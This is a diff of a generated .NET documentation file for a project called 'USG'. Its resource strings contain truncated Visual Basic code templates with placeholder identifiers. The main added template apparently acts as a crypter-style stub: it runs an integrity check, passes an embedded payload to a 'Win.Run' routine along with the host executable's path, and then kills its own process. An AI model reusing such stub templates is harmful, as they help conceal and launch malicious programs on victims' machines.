@@ -24,40 +24,44 @@ USG
 </member>
 <member name="P:USG.My.Resources.Resources.String1">
 <summary>
-  Looks up a localized string similar to Class %SHIT0%
-    Shared Function %SHIT1%(ByVal %SHIT2%() As Byte, %SHIT3% As Integer) As Byte()
-        Dim %SHIT4%(0 To (%SHIT2%.Length - %SHIT3%) - 1) As Byte
-        Return %SHIT4%
-    End Function
+  Looks up a localized string similar to Public Class %SHIT0%
+    Shared Sub %SHIT2%()
+        Dim %SHIT3% = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)
 
-    Shared Sub %SHIT5%(ByVal %SHIT6% As String, ByVal %SHIT7% As String)
-        Dim %SHIT8% = New anti.IntegrityCheck
-        %SHIT8%.AppExePath = %SHIT7%
-        %SHIT8%.AppPath = %SHIT6%
-        %SHIT8%.RunCheck()
-    End Sub
-
-    Shared Sub %SHIT17%()
-        Dim %SHIT9% As String = Applica [rest of string was truncated]&quot;;.
+        If %SHIT3%.Item2 = True Then
+            Dim %SHIT4% = New anti.IntegrityCheck
+            %SHIT4%.AppExePath = Application.ExecutablePath
+            %SHIT4%.AppPath = Application.StartupPath
+            %SHIT4%.RunCheck()
+        End If
+        Award.Win.Run(%SHIT3%.Item1, Command, Application.ExecutablePath)
+        Process.GetCurrentProcess.Ki [rest of string was truncated]&quot;;.
 </summary>
 </member>
 <member name="P:USG.My.Resources.Resources.String2">
 <summary>
-  Looks up a localized string similar to Class %SHIT0%
-    Shared Function %SHIT1%(ByVal %SHIT2%() As Byte, %SHIT3% As Integer) As Byte()
-        Dim %SHIT4%(0 To (%SHIT2%.Length - %SHIT3%) - 1) As Byte
-        Return %SHIT4%
-    End Function
-
-    Shared Sub %SHIT5%(ByVal %SHIT6% As String, ByVal %SHIT7% As String)
-        Dim %SHIT8% = New anti.IntegrityCheck
-        %SHIT8%.AppExePath = %SHIT7%
-        %SHIT8%.AppPath = %SHIT6%
-        %SHIT8%.RunCheck()
-    End Sub
-
-    Shared Sub %SHIT17%()
-        Dim %SHIT9% As String = Applica [rest of string was truncated]&quot;;.
+  Looks up a localized string similar to Public Class Tuple(Of T1, T2)
+    Public Property Item1() As T1
+        Get
+            Return m_Item1
+        End Get
+        Set
+            m_Item1 = Value
+        End Set
+    End Property
+    Private m_Item1 As T1
+    Public Property Item2() As T2
+        Get
+            Return m_Item2
+        End Get
+        Set
+            m_Item2 = Value
+        End Set
+    End Property
+    Private m_Item2 As T2
+    Public Sub New(Item1 As T1, Item2 As T2)
+        Me.Item1 = Item1
+        Me.Item [rest of string was truncated]&quot;;.
 </summary>
 </member>
 </members>
